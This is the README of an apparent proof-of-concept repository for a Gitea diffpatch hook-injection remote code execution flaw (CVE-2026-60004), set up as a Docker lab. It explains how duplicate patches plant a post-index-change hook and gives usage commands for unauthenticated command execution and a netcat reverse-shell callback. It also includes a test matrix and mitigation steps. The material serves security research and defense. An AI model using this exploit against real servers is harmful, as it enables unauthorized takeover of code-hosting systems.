# Gitea diffpatch Git Hook Injection RCE (CVE-2026-60004)

> [!WARNING]
> **Disclaimer**: This repository is strictly created for academic research, education, and defense verification in an isolated laboratory environment. Unauthorized testing or exploitation of third-party systems is illegal.

## Overview

This repository contains the reproduction environment and verification scripts for **CVE-2026-60004** (CVSS 9.8, Critical), affecting Gitea `>= 1.17.0, < 1.27.1`.

The vulnerability resides in Gitea's `diffpatch` API (`POST /api/v1/repos/{owner}/{repo}/diffpatch`). When duplicate new-file patches are applied within a bare temporary clone, Git's 3-way merge (`-3`) resolution writes an executable hook directly into `$GIT_DIR/hooks/post-index-change`, resulting in remote code execution upon index update under the `git` service user (`uid=1000`).

## Project Structure

```text
.
├── docker-compose.yml       # Minimal single-service vulnerable Gitea deployment
├── REPORT.md                # Full academic report (Sections I ~ IV)
└── poc/
    ├── exploit.py           # Modular PoC script (--cmd, --lhost, --verify-container)
    ├── matrix_test.py       # 4-case architectural boundary & mechanism matrix
    └── requirements.txt     # Python dependencies (requests)
```

---

## Quick Start

### 1. Prerequisites
- Docker Engine & Docker Compose plugin (`docker compose`)
- Python 3.10+
- Python library `requests`:
  ```bash
  pip install -r poc/requirements.txt
  ```
- Netcat (`nc`) for optional interactive callback verification

### 2. Start the Environment
```bash
docker compose up -d
```
Gitea will be available at `http://localhost:5000`. The deployment runs a single, lean Gitea service. Because public registration is enabled by default (`DISABLE_REGISTRATION = false`), no pre-seeded credentials or initial setup scripts are needed—the PoC operates via zero-credential auto-registration, perfectly matching the CVE's `PR:N` (unauthenticated) attack vector.

---

## Reproduction & Verification Walkthrough

### Option A: Command Execution (Zero-Credential Mode)
Execute arbitrary commands on the target container. The script automatically self-registers a disposable user account and repository:
```bash
# Basic remote command execution:
python3 poc/exploit.py --url http://localhost:5000 --cmd "id"

# Command execution with automated container-side verification:
python3 poc/exploit.py --url http://localhost:5000 --cmd "id; uname -a" --verify-container
```

*(Optional) Using pre-existing credentials:*
```bash
python3 poc/exploit.py --url http://localhost:5000 --username myuser --password "MyPassword123!" --repo myrepo --cmd "id"
```

### Option B: Interactive Reverse Shell Callback
#### Step 1: Start Netcat Listener on Host
```bash
nc -lvnp 4000
```

#### Step 2: Determine Docker Gateway IP
- **Linux Docker bridge**:
  ```bash
  GATEWAY_IP="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' gitea-cve-2026-60004)"
  echo "${GATEWAY_IP}"
  ```
- **Docker Desktop (macOS / Windows)**: use `host.docker.internal`

#### Step 3: Trigger Reverse Shell
```bash
python3 poc/exploit.py --url http://localhost:5000 --lhost "${GATEWAY_IP}" --lport 4000
```

---

## Controlled Variable & Architectural Boundary Matrix

To verify Git's `--cached`, `-3` merge behavior, and hook execution boundaries across 4 distinct test conditions:
```bash
python3 poc/matrix_test.py --url http://localhost:5000
```

### Matrix Test Cases:
| Case | Condition | Target Path | Repeat | Expected HTTP | Expected Execution | Mechanism Verified |
| :---: | :--- | :--- | :---: | :---: | :---: | :--- |
| **1** | Single Patch Isolation | `hooks/post-index-change` | 1x | `[201]` | ❌ FAILED | `--cached` isolation without collision; no disk write. |
| **2** | Pre-existing File Vector | `config` | 2x | `[201, 500]` | ❌ FAILED | Git 3-way merge aborts; existing `$GIT_DIR` files cannot be overwritten. |
| **3** | Inapplicable Lifecycle Hook | `hooks/pre-commit` | 2x | `[201, 201]` | ❌ FAILED | Hook file written to disk, but plumbing operations do not execute `pre-commit`. |
| **4** | Target Exploit Condition | `hooks/post-index-change` | 2x | `[201, 201]` | ✅ **SUCCESS** | Add/add collision forces hook to disk; index write immediately executes it. |

---

## Teardown

To stop and remove containers, networks, and persistent volumes:
```bash
docker compose down -v
```

---

## Mitigation & Remediation

1. **Upgrade**: Update Gitea to version `1.27.1` or later.
2. **Configuration Hardening**: If an immediate upgrade is not possible:
   - Disable public self-registration (`DISABLE_REGISTRATION = true` under `[service]` in `app.ini`) to prevent unauthenticated account provisioning.
   - Restrict or block `POST /api/v1/repos/*/*/diffpatch` at the reverse proxy until patched, as authenticated users with repository write permissions can reach the vulnerable code path.
